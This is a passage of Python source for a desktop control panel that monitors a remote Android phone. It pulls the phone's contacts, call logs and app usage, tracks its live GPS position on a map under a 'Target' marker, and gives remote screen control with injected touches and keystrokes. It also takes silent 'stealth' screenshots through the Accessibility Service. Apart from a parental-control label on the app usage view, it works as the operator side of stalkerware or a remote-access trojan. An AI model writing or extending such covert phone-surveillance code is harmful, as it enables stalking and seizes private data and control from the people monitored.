            ctk.CTkLabel(frame, text="👤", font=("Segoe UI", 20)).pack(side="left", padx=(15, 10))
            
            # Info
            info = ctk.CTkFrame(frame, fg_color="transparent")
            info.pack(side="left", fill="both", expand=True, pady=8)
            ctk.CTkLabel(info, text=name, font=self.FONT_HEADER, text_color=self.C_TEXT, anchor="w").pack(side="top", anchor="w")
            ctk.CTkLabel(info, text=phones if phones else "No Number", font=self.FONT_SMALL, text_color=self.C_MUTED, anchor="w").pack(side="top", anchor="w")
            
        self._contacts_rendered = end
        print(f"[DEBUG] Rendered contacts {start} to {end}")

    def _on_contacts_search_change(self, event):
        query = self.contact_search.get().lower()
        self._filtered_contacts = [c for c in self._full_contacts_list if query in str(c.get('name', '')).lower() or any(query in str(p) for p in c.get('phones', []))]
        
        for child in self.contacts_scroll_frame.winfo_children():
            child.destroy()
        self._contacts_rendered = 0
        self._render_contacts_batch()

    # --- CALL LOGS VIEW ---
    def show_call_logs_view(self):
        self.current_main_view = "call_logs"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        top_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=50, corner_radius=0)
        top_frame.pack(fill="x", padx=0, pady=0)
        top_frame.pack_propagate(False)
        
        ctk.CTkLabel(top_frame, text=" 📞 CALL HISTORY", font=self.FONT_HEADER, text_color="#ef4444").pack(side="left", padx=20)
        
        self.logs_search = ctk.CTkEntry(top_frame, placeholder_text="Search number or name...", width=250, font=self.FONT_MAIN, fg_color=self.C_BG, border_color=self.C_HOVER)
        self.logs_search.pack(side="right", padx=20, pady=10)
        self.logs_search.bind("<KeyRelease>", self._on_logs_search_change)

        self.logs_count_label = ctk.CTkLabel(top_frame, text="Count: 0", font=self.FONT_SMALL, text_color=self.C_MUTED)
        self.logs_count_label.pack(side="right", padx=15)

        self.logs_scroll_frame = ctk.CTkScrollableFrame(self.main_frame, fg_color="transparent", corner_radius=0)
        self.logs_scroll_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        ctk.CTkLabel(self.logs_scroll_frame, text="⏳ Fetching Call Logs...", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
        self.webrtc.request_call_logs()

    def _update_call_logs_list(self, data):
        if getattr(self, 'current_main_view', None) != "call_logs": return
        for child in self.logs_scroll_frame.winfo_children():
            child.destroy()
            
        logs = data.get('logs', [])
        # Newest first
        logs.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
        
        self._full_logs_list = logs
        self._filtered_logs = logs.copy()
        self._logs_rendered = 0
        self._PAGE_SIZE = 40
        
        if hasattr(self, 'logs_count_label'):
            self.logs_count_label.configure(text=f"TOTAL LOGS: {len(logs)}")
            
        if not logs:
            ctk.CTkLabel(self.logs_scroll_frame, text="No call logs found on device.", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
            return

        self._render_call_logs_batch()
        self._bind_scroll(self.logs_scroll_frame, self._render_call_logs_batch)

    def _on_logs_search_change(self, event):
        query = self.logs_search.get().lower()
        self._filtered_logs = [l for l in self._full_logs_list if query in str(l.get('name', '')).lower() or query in str(l.get('number', ''))]
        
        for child in self.logs_scroll_frame.winfo_children():
            child.destroy()
        self._logs_rendered = 0
        self._render_call_logs_batch()

    def _render_call_logs_batch(self):
        if not hasattr(self, '_filtered_logs'): return
        if self._logs_rendered >= len(self._filtered_logs): return
        
        start = self._logs_rendered
        end = min(start + self._PAGE_SIZE, len(self._filtered_logs))
        
        import datetime
        for i in range(start, end):
            l = self._filtered_logs[i]
            frame = ctk.CTkFrame(self.logs_scroll_frame, fg_color=self.C_PANEL if i % 2 == 0 else self.C_ALT, corner_radius=4)
            frame.pack(fill="x", pady=2, padx=10)
            
            name = l.get('name', 'Unknown')
            number = l.get('number', '')
            ctype = str(l.get('type', '')).split('.')[-1].upper()
            duration = f"{l.get('duration', 0)}s"
            ts = l.get('timestamp', 0)
            date_str = datetime.datetime.fromtimestamp(ts/1000.0).strftime('%Y-%m-%d %H:%M')
            
            color = "#22c55e" if "INCOMING" in ctype else "#3a82f7"
            if "MISSED" in ctype: color = "#ef4444"
            
            ctk.CTkLabel(frame, text=f"{ctype}", font=self.FONT_HEADER, text_color=color, width=100).pack(side="left", padx=10)
            ctk.CTkLabel(frame, text=f"{name} ({number})", font=self.FONT_MAIN, text_color=self.C_TEXT, anchor="w").pack(side="left", padx=10, fill="x", expand=True)
            ctk.CTkLabel(frame, text=f"{date_str} [{duration}]", font=self.FONT_SMALL, text_color=self.C_MUTED).pack(side="right", padx=15)
            
        self._logs_rendered = end

    def _update_devices_ui(self):
        """Update the device status label in the sidebar and refresh selection view if active"""
        active_count = len(self.active_devices)
        if hasattr(self, 'devices_label'):
            self.devices_label.configure(text=f"CLOUD DEVICES:\n[{active_count} Active / {len(self.known_devices)} Total]", 
                                              text_color=self.C_ACCENT if active_count > 0 else self.C_MUTED)
        
        # Auto-refresh selection view if focused
        if getattr(self, 'current_main_view', None) == "selection":
            self.show_device_selection_view()

    # --- PARENTAL CONTROL (APP USAGE) VIEW ---
    def show_usage_view(self):
        self.current_main_view = "parental"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        top_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=50, corner_radius=0)
        top_frame.pack(fill="x", padx=0, pady=0)
        top_frame.pack_propagate(False)
        
        ctk.CTkLabel(top_frame, text=" 🛡️ DIGITAL WELLBEING (7 DAYS)", font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(side="left", padx=20)
        
        self.usage_refresh_btn = ctk.CTkButton(top_frame, text="🔄 REFRESH", width=100, font=self.FONT_SMALL, 
                                             command=self.webrtc.request_usage_stats, fg_color="#3a82f7", hover_color="#2563eb")
        self.usage_refresh_btn.pack(side="right", padx=20, pady=10)
        
        self.usage_count_label = ctk.CTkLabel(top_frame, text="", font=self.FONT_SMALL, text_color=self.C_MUTED)
        self.usage_count_label.pack(side="right", padx=15)

        # Day selector tabs
        self.day_tabs_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_BG, height=45, corner_radius=0)
        self.day_tabs_frame.pack(fill="x", padx=0, pady=0)
        self.day_tabs_frame.pack_propagate(False)

        self.usage_scroll_frame = ctk.CTkScrollableFrame(self.main_frame, fg_color="transparent", corner_radius=0)
        self.usage_scroll_frame.pack(fill="both", expand=True, padx=20, pady=(10, 20))
        
        # Track selected day index
        self._selected_day_index = 0

        if not hasattr(self, 'app_usage_days') or not self.app_usage_days:
            ctk.CTkLabel(self.usage_scroll_frame, text="⏳ Fetching Screen Time Data...\n(Requires 'Usage Access' permission on device)", 
                         font=self.FONT_MAIN, text_color=self.C_MUTED, justify="center").pack(pady=60)
            self.webrtc.request_usage_stats()
        else:
            self._render_day_tabs()
            self._render_usage_for_day(0)

    def _update_app_usage_list(self, data):
        """Update usage stats data and refresh view if active"""
        self.app_usage_data = data.get('usage', [])
        # Store 7-day data if available
        self.app_usage_days = data.get('days', [])
        
        # If no 'days' key (old format), wrap today's data
        if not self.app_usage_days and self.app_usage_data:
            self.app_usage_days = [{'date': 'today', 'label': 'Today', 'usage': self.app_usage_data}]
        
        if getattr(self, 'current_main_view', None) == "parental":
            self._render_day_tabs()
            self._render_usage_for_day(getattr(self, '_selected_day_index', 0))

        # Also update dashboard summary if on dashboard
        if getattr(self, 'current_main_view', None) == "dashboard":
            if hasattr(self, 'dashboard_usage_frame') and self.app_usage_data:
                self._update_dashboard_usage_summary()

    def _update_dashboard_usage_summary(self):
        """Render a small summary of usage on the dashboard"""
        if not hasattr(self, 'usage_summary_container') or not self.usage_summary_container.winfo_exists():
            return
            
        for child in self.usage_summary_container.winfo_children():
            child.destroy()
            
        top_apps = sorted(self.app_usage_data, key=lambda x: x.get('usageTime', x.get('totalTime', 0)), reverse=True)[:5]
        
        if not top_apps:
            ctk.CTkLabel(self.usage_summary_container, text="No usage recorded for today.", 
                         font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=30)
            return

        for app in top_apps:
            row = ctk.CTkFrame(self.usage_summary_container, fg_color="transparent")
            row.pack(fill="x", pady=5)
            
            name = app.get('appName', app.get('packageName', 'Unknown'))
            ms = app.get('usageTime', app.get('totalTime', 0))
            
            # Simple format: 1h 20m
            minutes = int((ms / (1000 * 60)) % 60)
            hours = int((ms / (1000 * 60 * 60)))
            time_str = f"{hours}h {minutes}m" if hours > 0 else f"{minutes}m"
            
            ctk.CTkLabel(row, text=f"• {name}", font=self.FONT_MAIN, text_color=self.C_TEXT, anchor="w").pack(side="left")
            ctk.CTkLabel(row, text=time_str, font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(side="right")

    def _render_day_tabs(self):
        """Render day selector tabs at the top"""
        if not hasattr(self, 'day_tabs_frame') or not self.day_tabs_frame.winfo_exists():
            return
            
        for child in self.day_tabs_frame.winfo_children():
            child.destroy()
            
        if not self.app_usage_days:
            return
            
        for i, day in enumerate(self.app_usage_days):
            label = day.get('label', day.get('date', f'Day {i}'))
            is_selected = (i == getattr(self, '_selected_day_index', 0))
            
            # Calculate total screen time for this day
            day_usage = day.get('usage', [])
            total_ms = sum(a.get('usageTime', a.get('totalTime', 0)) for a in day_usage)
            h = int(total_ms / (1000 * 60 * 60))
            m = int((total_ms / (1000 * 60)) % 60)
            time_hint = f"{h}h {m}m" if h > 0 else f"{m}m"
            
            btn_text = f"{label}\n{time_hint}"
            
            btn = ctk.CTkButton(
                self.day_tabs_frame, 
                text=btn_text,
                width=110, height=38,
                corner_radius=6,
                font=("Segoe UI", 11, "bold" if is_selected else "normal"),
                fg_color=self.C_ACCENT if is_selected else "transparent",
                text_color="#fff" if is_selected else self.C_MUTED,
                hover_color=self.C_HOVER,
                command=lambda idx=i: self._select_day(idx)
            )
            btn.pack(side="left", padx=4, pady=4)
    
    def _select_day(self, index):
        """Switch to a different day"""
        self._selected_day_index = index
        self._render_day_tabs()
        self._render_usage_for_day(index)

    def _render_usage_for_day(self, day_index):
        """Render usage stats for a specific day"""
        if not hasattr(self, 'usage_scroll_frame') or not self.usage_scroll_frame.winfo_exists():
            return
        if getattr(self, 'current_main_view', None) != "parental":
            return
            
        for child in self.usage_scroll_frame.winfo_children():
            child.destroy()
        
        if not self.app_usage_days or day_index >= len(self.app_usage_days):
            ctk.CTkLabel(self.usage_scroll_frame, text="No usage data available.", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
            return
        
        day_data = self.app_usage_days[day_index]
        day_usage = day_data.get('usage', [])
        day_label = day_data.get('label', 'Unknown')
        
        if not day_usage:
            ctk.CTkLabel(self.usage_scroll_frame, text=f"📱 No screen time recorded for {day_label}.", font=self.FONT_MAIN, text_color=self.C_MUTED).pack(pady=40)
            return
        
        # Sort by usage time descending
        self._sorted_usage = sorted(day_usage, key=lambda x: x.get('usageTime', x.get('totalTime', 0)), reverse=True)
        self._usage_rendered = 0
        self._PAGE_SIZE = 30

        # Header: total screen time
        total_time = sum(app.get('usageTime', app.get('totalTime', 0)) for app in day_usage)
        hours = int(total_time / (1000 * 60 * 60))
        mins = int((total_time / (1000 * 60)) % 60)
        
        header = ctk.CTkFrame(self.usage_scroll_frame, fg_color=self.C_PANEL, corner_radius=8)
        header.pack(fill="x", pady=(0, 15), padx=5)
        ctk.CTkLabel(header, text=f"📊 {day_label.upper()} — SCREEN TIME: {hours}h {mins}m", font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(pady=15)
        
        # Update count label
        if hasattr(self, 'usage_count_label') and self.usage_count_label.winfo_exists():
            self.usage_count_label.configure(text=f"Apps: {len(day_usage)}")

        self._render_usage_stats_batch()
        self._bind_scroll(self.usage_scroll_frame, self._render_usage_stats_batch)

    def _render_usage_stats_batch(self):
        if not hasattr(self, '_sorted_usage'): return
        if self._usage_rendered >= len(self._sorted_usage): return
        
        start = self._usage_rendered
        end = min(start + self._PAGE_SIZE, len(self._sorted_usage))
        
        for i in range(start, end):
            app = self._sorted_usage[i]
            ms = app.get('usageTime', app.get('totalTime', 0))
            
            frame = ctk.CTkFrame(self.usage_scroll_frame, fg_color=self.C_PANEL if i % 2 == 0 else self.C_ALT, corner_radius=4)
            frame.pack(fill="x", pady=2, padx=10)
            
            name = app.get('appName', 'Unknown')
            pkg = app.get('packageName', '')
            
            # Format time
            seconds = int((ms / 1000) % 60)
            minutes = int((ms / (1000 * 60)) % 60)
            hours = int((ms / (1000 * 60 * 60)))
            
            time_str = ""
            if hours > 0: time_str += f"{hours}h "
            if minutes > 0 or hours > 0: time_str += f"{minutes}m "
            time_str += f"{seconds}s"

            # App Info
            info_sub = ctk.CTkFrame(frame, fg_color="transparent")
            info_sub.pack(side="left", padx=15, pady=8, fill="x", expand=True)
            
            ctk.CTkLabel(info_sub, text=name, font=self.FONT_HEADER, text_color=self.C_TEXT, anchor="w").pack(side="top", anchor="w")
            ctk.CTkLabel(info_sub, text=pkg, font=("Consolas", 10), text_color=self.C_MUTED, anchor="w").pack(side="top", anchor="w")
            
            # Time Label
            time_color = self.C_ACCENT if hours > 0 else self.C_TEXT
            if hours >= 2: time_color = "#ef4444" # Warning for high usage
            
            ctk.CTkLabel(frame, text=time_str, font=("Segoe UI", 14, "bold"), text_color=time_color).pack(side="right", padx=20)

        self._usage_rendered = end

    # --- LOCATION TRACKING VIEW ---
    def show_location_view(self):
        self.current_main_view = "location"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        top_frame = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=50, corner_radius=0)
        top_frame.pack(fill="x", padx=0, pady=0)
        top_frame.pack_propagate(False)
        
        ctk.CTkLabel(top_frame, text=" 📍 LIVE LOCATION TRACKING", font=self.FONT_HEADER, text_color=self.C_ACCENT).pack(side="left", padx=20)
        
        self.loc_status_btn = ctk.CTkButton(top_frame, text="🛑 Stop Tracking", width=120, font=self.FONT_SMALL, 
                                             command=self._toggle_location_tracking, fg_color="#ef4444", hover_color="#dc2626")
        self.loc_status_btn.pack(side="right", padx=20, pady=10)

        # Map display area
        map_container = ctk.CTkFrame(self.main_frame, fg_color=self.C_BG, corner_radius=0)
        map_container.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Info bar above map
        info_bar = ctk.CTkFrame(map_container, fg_color="transparent", height=40)
        info_bar.pack(fill="x", pady=(0, 10))
        
        self.loc_coords_label = ctk.CTkLabel(info_bar, text="Awaiting GPS signal...", font=("Consolas", 14), text_color=self.C_MUTED)
        self.loc_coords_label.pack(side="left")
        
        self.loc_browser_btn = ctk.CTkButton(info_bar, text="🌐 Open in Google Maps", 
                                             fg_color=self.C_ALT, border_width=1, border_color=self.C_HOVER,
                                             command=self._open_in_browser, state="disabled")
        self.loc_browser_btn.pack(side="right", padx=(10, 0))

        # Launch Live Web Tracker button
        self.web_tracker_btn = ctk.CTkButton(info_bar, text="🔥 Live Web Tracker", 
                                             fg_color=self.C_ACCENT, hover_color="#dc2626", # Red/Orange accent
                                             command=self._launch_live_web_tracker)
        self.web_tracker_btn.pack(side="right", padx=(10, 0))

        # View Type Toggle
        self.loc_view_btn = ctk.CTkButton(info_bar, text="🗺️ Satellite View", width=120,
                                             fg_color=self.C_ALT, border_width=1, border_color=self.C_HOVER,
                                             command=self._toggle_map_view)
        self.loc_view_btn.pack(side="right")

        # Initialize Map Widget with Offline Database Caching
        db_path = os.path.join(os.getcwd(), "offline_map_cache.db")
        self.map_widget = tkintermapview.TkinterMapView(map_container, corner_radius=8, database_path=db_path)
        self.map_widget.pack(fill="both", expand=True)
        
        # Initial setting (Google Normal Map is much faster than OSM)
        self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=m&hl=en&x={x}&y={y}&z={z}&s=Ga", max_zoom=22)
        self.map_widget.set_zoom(2) # World view initially
        self.location_marker = None
        self._current_lat = None
        self._current_lng = None

        # Request start tracking on Android side
        self._is_tracking_location = True
        if hasattr(self.webrtc, 'data_channel') and self.webrtc.data_channel.readyState == "open":
            self.webrtc.send_command({"type": "start_location"})

    def _toggle_map_view(self):
        if not self.map_widget: return
        # Toggle between Google Normal and Google Satellite
        current = getattr(self, '_map_view_type', 'normal')
        if current == 'normal':
            self._map_view_type = 'satellite'
            self.loc_view_btn.configure(text="🗺️ Normal View")
            self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=s&hl=en&x={x}&y={y}&z={z}&s=Ga", max_zoom=22)
        else:
            self._map_view_type = 'normal'
            self.loc_view_btn.configure(text="🗺️ Satellite View")
            self.map_widget.set_tile_server("https://mt0.google.com/vt/lyrs=m&hl=en&x={x}&y={y}&z={z}&s=Ga", max_zoom=22)

    def _open_in_browser(self):
        if self._current_lat is not None and self._current_lng is not None:
            url = f"https://www.google.com/maps/search/?api=1&query={self._current_lat},{self._current_lng}"
            webbrowser.open(url)

    def _launch_live_web_tracker(self):
        """Launches the standalone HTML web tracker in Google Chrome with robust parameter passing."""
        html_file = os.path.abspath("live_tracker.html")
        if not os.path.exists(html_file):
            print(f"[ERROR] {html_file} not found!")
            return
            
        # Get the current WS URI from webrtc handler
        if hasattr(self, 'webrtc') and hasattr(self.webrtc, 'uri'):
            ws_uri = self.webrtc.uri
        else:
            try:
                with open("server_url.txt", "r") as f:
                    ws_uri = f.read().strip()
            except:
                ws_uri = "wss://YOUR_RENDER_APP_NAME.onrender.com/ws"

        # Format URL for Windows: file:///F:/path/to/file.html?ws=...
        drive, path = os.path.splitdrive(html_file)
        formatted_path = path.replace("\\", "/")
        file_url = f"file:///{drive.replace(':', '')}:/{formatted_path.lstrip('/')}?ws={ws_uri}"
        
        # Try to find Chrome explicitly
        chrome_paths = [
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
        ]
        
        chrome_exe = None
        for path in chrome_paths:
            if os.path.exists(path):
                chrome_exe = path
                break
                
        if chrome_exe:
            try:
                import subprocess
                # Launching with subprocess Popen is much more reliable on Windows for specific browsers
                # We use --no-first-run to try and skip account selection screens if it's a fresh instance
                subprocess.Popen([chrome_exe, file_url, "--no-first-run", "--no-default-browser-check"])
                print(f"[SYSTEM] Launched Live Web Tracker in Chrome: {chrome_exe}")
                return
            except Exception as e:
                print(f"[ERROR] Subprocess launch failed: {e}")

        # Final Fallback to default browser
        print("[SYSTEM] Using fallback browser.")
        webbrowser.open(file_url)

    def _toggle_location_tracking(self):
        if not hasattr(self.webrtc, 'data_channel') or self.webrtc.data_channel.readyState != "open":
            return
            
        if getattr(self, '_is_tracking_location', False):
            self.webrtc.send_command({"type": "stop_location"})
            self._is_tracking_location = False
            if hasattr(self, 'loc_status_btn') and self.loc_status_btn.winfo_exists():
                self.loc_status_btn.configure(text="▶ Start Tracking", fg_color="#22c55e", hover_color="#16a34a")
        else:
            self.webrtc.send_command({"type": "start_location"})
            self._is_tracking_location = True
            if hasattr(self, 'loc_status_btn') and self.loc_status_btn.winfo_exists():
                self.loc_status_btn.configure(text="🛑 Stop Tracking", fg_color="#ef4444", hover_color="#dc2626")
                
    def _update_location_ui(self, data):
        """Called when a location update arrives from the device"""
        if getattr(self, 'current_main_view', None) != "location":
            # If not looking at the map, we still receive data but don't draw it.
            # Could save it to a track log history here if we wanted.
            return
            
        lat = data.get('lat')
        lng = data.get('lng')
        acc = data.get('accuracy', 0)
        
        # Provide heading for compass support
        heading = data.get('heading', 0.0)
        
        if lat is None or lng is None:
            return
            
        self._current_lat = lat
        self._current_lng = lng
        
        # Update text
        if hasattr(self, 'loc_coords_label') and self.loc_coords_label.winfo_exists():
            self.loc_coords_label.configure(text=f"Lat: {lat:.6f} | Lng: {lng:.6f} | Acc: ±{acc:.1f}m | Hdg: {heading:.1f}°", text_color="#22c55e")
            self.loc_browser_btn.configure(state="normal")
            
        # Extremely fast throttle (10 FPS limit) to enable perfectly live compass streaming without UI freezing
        import time
        now = time.time()
        if now - getattr(self, '_last_map_redraw_time', 0) < 0.1:
            return  # Limit to 10 draw calls per second
        self._last_map_redraw_time = now
            
        # Dynamically generate directional compass icon using PIL based on current 'heading'
        if not hasattr(self, '_base_compass_img'):
            from PIL import Image, ImageDraw
            img = Image.new("RGBA", (50, 50), (255, 255, 255, 0))
            d = ImageDraw.Draw(img)
            # Arrow/Cone pointing UP (0 degrees = North)
            d.ellipse((10, 10, 40, 40), fill=(220, 38, 38, 200), outline=(255, 255, 255, 255), width=2)
            d.polygon([(25, 0), (15, 20), (35, 20)], fill=(220, 38, 38, 255))
            self._base_compass_img = img
            
        from PIL import Image, ImageTk
        # Heading is 0=North, 90=East. PIL rotate goes counter-clockwise so we negate the heading.
        rot_img = self._base_compass_img.rotate(-float(heading), expand=False, resample=Image.BICUBIC)
        compass_icon = ImageTk.PhotoImage(rot_img)
        self._current_compass_icon = compass_icon  # Important: keep garbage collection away
            
        # Update map
        if self.map_widget:
            # Set position & zoom only on initial load
            if self.location_marker is None:
                self.map_widget.set_position(lat, lng)
                self.map_widget.set_zoom(16)
                self.location_marker = self.map_widget.set_marker(lat, lng, icon=compass_icon, text="Target")
            else:
                self.location_marker.change_icon(compass_icon)
                self.location_marker.set_position(lat, lng)

    # --- SHARED HELPERS ---
    def _bind_scroll(self, scroll_frame, callback):
        """Robustly bind scroll events for lazy loading"""
        try:
            canvas = scroll_frame._parent_canvas
            # Bind to mouse wheel
            canvas.bind_all("<MouseWheel>", lambda e: self._on_generic_mousewheel(e, scroll_frame, callback), add="+")
            # Also bind to internal configuration (scrolling or resizing)
            canvas.bind("<Configure>", lambda e: self.after(100, lambda: self._check_generic_scroll(scroll_frame, callback)), add="+")
        except: pass

    def _on_generic_mousewheel(self, event, scrollable_frame, callback):
        # Allow scrolling if widget is alive and visible
        if scrollable_frame.winfo_exists():
            self.after(50, lambda: self._check_generic_scroll(scrollable_frame, callback))

    def _check_generic_scroll(self, scroll_frame, callback):
        try:
            canvas = scroll_frame._parent_canvas
            if canvas.yview()[1] > 0.85: # 85% reached
                callback()
        except: pass

    def show_screen_control_view(self):
        self.current_main_view = "screen"
        for child in self.main_frame.winfo_children():
            child.destroy()
            
        header = ctk.CTkFrame(self.main_frame, fg_color=self.C_PANEL, height=60, corner_radius=0)
        header.pack(fill="x")
        header.pack_propagate(False)
        
        ctk.CTkLabel(header, text="💻 REMOTE SCREEN CONTROL", font=self.FONT_HEADER).pack(side="left", padx=20)
        
        nav_frame = ctk.CTkFrame(header, fg_color="transparent")
        nav_frame.pack(side="right", padx=10)
        
        # Hardware Nav Emulation
        ctk.CTkButton(nav_frame, text="◁ Back", width=60, height=28, fg_color=self.C_HOVER, command=lambda: self.webrtc.send_touch_event("navigation", 0,0, nav_action="BACK")).pack(side="left", padx=2)
        ctk.CTkButton(nav_frame, text="○ Home", width=60, height=28, fg_color=self.C_HOVER, command=lambda: self.webrtc.send_touch_event("navigation", 0,0, nav_action="HOME")).pack(side="left", padx=2)
        ctk.CTkButton(nav_frame, text="▢ Recents", width=70, height=28, fg_color=self.C_HOVER, command=lambda: self.webrtc.send_touch_event("navigation", 0,0, nav_action="RECENTS")).pack(side="left", padx=2)
        ctk.CTkButton(nav_frame, text="☼ Wake", width=60, height=28, fg_color="#f59e0b", hover_color="#d97706", command=lambda: self.webrtc.send_touch_event("navigation", 0,0, nav_action="WAKE")).pack(side="left", padx=2)
        
        self.screen_container = ctk.CTkFrame(self.main_frame, fg_color="#000")
        self.screen_container.pack(fill="both", expand=True, padx=20, pady=20)
        
        self.screen_display = ctk.CTkLabel(self.screen_container, text="Awaiting screen share approval on device...", font=self.FONT_MAIN)
        self.screen_display.pack(expand=True)
        
        # Interaction Bindings
        def _get_norm_coords(event):
            w = self.screen_display.winfo_width()
            h = self.screen_display.winfo_height()
            if w <= 0 or h <= 0: return 0.5, 0.5
            return event.x / w, event.y / h

        def _on_right_click(e):
            x, y = _get_norm_coords(e)
            self.webrtc.send_touch_event("long_press", x, y)

        def _on_key_press(e):
            # Forward keyboard characters to the phone
            if self.current_main_view != "screen": return
            if e.char and ord(e.char) >= 32: # Printable chars
                self.webrtc.send_touch_event("type", 0, 0, text=e.char)
            elif e.keysym == "BackSpace":
                # Special handling for backspace if needed, for now just send as empty or specialized signal
                self.webrtc.send_touch_event("type", 0, 0, text="") # Or implement backspace via shell/globalevent
            elif e.keysym == "Return":
                self.webrtc.send_touch_event("navigation", 0, 0, nav_action="ENTER")

        def _on_drag_start(e):
            self._drag_start_point = (e.x, e.y) # Use real pixels for threshold
            self._drag_start_coords = _get_norm_coords(e)
            
        def _on_drag_end(e):
            if not hasattr(self, '_drag_start_coords'): return
            x1, y1 = self._drag_start_coords
            x2, y2 = _get_norm_coords(e)
            
            # Calculate pixel distance for high-precision tap detection
            dx = e.x - self._drag_start_point[0]
            dy = e.y - self._drag_start_point[1]
            pixel_dist = (dx**2 + dy**2)**0.5
            
            if pixel_dist > 15: # Significant movement = Swipe
                print(f"[Input] Sending Swipe from ({x1:.2f}, {y1:.2f}) to ({x2:.2f}, {y2:.2f})")
                self.webrtc.send_touch_event("swipe", x1, y1, x2=x2, y2=y2, duration=420)
            else: # Real click / tap
                print(f"[Input] Sending Tap at ({x1:.2f}, {y1:.2f})")
                self.webrtc.send_touch_event("tap", x1, y1)

        self.screen_display.bind("<Button-1>", _on_drag_start)
        self.screen_display.bind("<ButtonRelease-1>", _on_drag_end)
        self.screen_display.bind("<Button-3>", _on_right_click)
        self.bind("<Key>", _on_key_press)

    def _take_stealth_screenshot(self):
        """Request a silent screenshot via Accessibility Service"""
        self.webrtc.send_command({"type": "take_screenshot"})
        if hasattr(self, 'devices_label'):
            self.devices_label.configure(text="📸 Requesting Screenshot...")

    def _show_screenshot_popup(self, data_bytes):
        """Display screenshot in a top-level window with save option"""
        self.after(0, lambda: self._ui_open_screenshot_popup(data_bytes))
        if hasattr(self, 'devices_label'):
            self.devices_label.configure(text="✅ Screenshot Received")

    def _ui_open_screenshot_popup(self, data):
        popup = ctk.CTkToplevel(self)
        popup.title("📸 Stealth Screenshot")
        popup.attributes("-topmost", True)
        
        try:
            img = Image.open(io.BytesIO(data))
            img_w, img_h = img.size
            
            # Target ~80% of monitor height to ensure it fits and buttons are visible
            screen_h = self.winfo_screenheight()
            max_h = int(screen_h * 0.8)
            max_w = int(self.winfo_screenwidth() * 0.8)
            
            # Calculate scale to fit within max box while maintaining aspect ratio
            scale = min(max_w / img_w, max_h / img_h, 1.0) # Never scale UP beyond original
            
            display_w = int(img_w * scale)
            display_h = int(img_h * scale)
            
            # Set window size based on scaled image + padding for buttons
            win_w = display_w + 40
            win_h = display_h + 120 # Padding for header/buttons
            popup.geometry(f"{win_w}x{win_h}")
            
            ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(display_w, display_h))
            
            label = ctk.CTkLabel(popup, image=ctk_img, text="")
            label.pack(pady=(20, 10), padx=20, expand=True)
            
            btn_frame = ctk.CTkFrame(popup, fg_color="transparent")
            btn_frame.pack(fill="x", pady=(0, 20))
            
            def save_img():
                from tkinter import filedialog
                path = filedialog.asksaveasfilename(defaultextension=".jpg", filetypes=[("JPEG", "*.jpg")])
                if path:
                    img.save(path)
                    
            ctk.CTkButton(btn_frame, text="💾 Save Image", command=save_img, width=120).pack(side="left", padx=20)
            ctk.CTkButton(btn_frame, text="❌ Close", command=popup.destroy, width=120).pack(side="right", padx=20)
        except Exception as e:
            ctk.CTkLabel(popup, text=f"⚠️ Failed to render screenshot: {e}").pack(pady=40)

    def show_apps_view(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()
            
        header = ctk.CTkFrame(self.main_frame, fg_color="transparent")
        header.pack(fill="x", padx=30, pady=(30, 10))
        
        ctk.CTkLabel(header, text="📱 Applications Dashboard", font=self.FONT_TITLE, text_color=self.C_TEXT).pack(side="left")
        
        # Refresh button
        ctk.CTkButton(header, text="🔄 Refresh List", width=120, height=32, command=self.webrtc.request_apps).pack(side="right", pady=5)
        
        # Grid container
        self.apps_scroll = ctk.CTkScrollableFrame(self.main_frame, fg_color="transparent")
        self.apps_scroll.pack(fill="both", expand=True, padx=20, pady=10)
        self.apps_scroll.grid_columnconfigure(list(range(5)), weight=1, pad=10)
        
        # Skeleton Phase: Draw 15 placeholders immediately
        for i in range(15):
            r, c = i // 5, i % 5
            skel = ctk.CTkFrame(self.apps_scroll, fg_color=self.C_ALT, corner_radius=12, height=160)
            skel.grid(row=r, column=c, padx=10, pady=10, sticky="nsew")
            
            circle = ctk.CTkFrame(skel, fg_color=self.C_HOVER, corner_radius=24, width=48, height=48)
            circle.pack(pady=(20, 10))
            
            line = ctk.CTkFrame(skel, fg_color=self.C_HOVER, corner_radius=4, width=80, height=12)
            line.pack(pady=5)
        
        # Trigger initial fetch
        self.webrtc.request_apps()

    def _update_app_list(self, data):
        apps = data.get("apps", [])
        
        # Clear skeleton cards
        for widget in self.apps_scroll.winfo_children():
            widget.destroy()
            
        if not apps:
            ctk.CTkLabel(self.apps_scroll, text="No third-party apps found.", font=self.FONT_HEADER, text_color=self.C_MUTED).pack(pady=50)
            return

        cols = 5
        self.apps_scroll.grid_columnconfigure(list(range(cols)), weight=1, pad=10)
        
        # Lazy Loading / Incremental Rendering
        import base64
        
        def render_batch(start_idx):
            end_idx = min(start_idx + 20, len(apps))
            batch = apps[start_idx:end_idx]
            
            for i, app in enumerate(batch):
                actual_idx = start_idx + i
                r, c = actual_idx // cols, actual_idx % cols
                
                card = ctk.CTkFrame(self.apps_scroll, fg_color=self.C_PANEL, corner_radius=12, border_width=1, border_color=self.C_HOVER)
                card.grid(row=r, column=c, padx=10, pady=10, sticky="nsew")
                
                # Icon
                icon_data = app.get("icon")
                ctk_img = None
                if icon_data:
                    try:
                        raw = base64.b64decode(icon_data)
                        pil_img = Image.open(io.BytesIO(raw))
